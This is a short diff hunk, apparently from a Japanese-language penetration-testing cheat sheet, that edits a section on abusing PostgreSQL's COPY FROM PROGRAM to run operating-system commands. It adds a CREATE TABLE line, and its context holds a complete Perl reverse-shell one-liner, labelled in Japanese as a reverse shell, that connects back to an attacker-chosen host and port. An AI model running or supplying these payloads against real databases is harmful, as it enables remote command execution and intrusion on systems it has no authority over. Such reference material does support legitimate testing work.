@@ -222,6 +222,7 @@ COPY cmd_exec FROM PROGRAM '<command>';
 SELECT * FROM cmd_exec;
 
 -- リバースシェル（シングルクォートは2つ重ねてエスケープ）
+CREATE TABLE cmd_exec(cmd_output text);
 COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
